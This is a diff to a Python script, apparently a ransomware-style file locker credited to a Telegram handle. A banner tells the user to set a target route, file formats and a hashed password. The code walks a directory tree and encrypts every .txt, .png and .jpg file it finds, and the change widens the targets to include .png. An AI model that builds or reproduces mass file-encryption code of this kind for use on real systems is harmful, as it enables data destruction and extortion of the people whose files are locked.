@@ -1,8 +1,8 @@
 ############################
 ##                Telegram : @esfelurm				    ##
-##In line 16 give a main route, or don't touch ##
-##Enter the formats in line 55 png,txt,jpg...  ##
-##Enter the password in line 17 (as a hash)     ##
+##In line 15 give a main route, or don't touch ##
+##Enter the formats in line 54 png,txt,jpg...  ##
+##Enter the password in line 16 (as a hash)     ##
 ##Use the following tool to hash the password##
 ##https://github.com/esfelurm/hashing !      ##
 ##                Telegram : @esfelurm				 	##
@@ -51,7 +51,7 @@ def decrypt_file(file_path, key):
 def find_and_encrypt_files(directory, key):
     for root, dirs, files in os.walk(directory):
         for file in files:
-            if file.lower().endswith(('.txt', '.nopolo', 'jpg')):
+            if file.lower().endswith(('.txt', '.png', 'jpg')):
                 file_path = os.path.join(root, file)
                 encrypt_file(file_path, key)
 
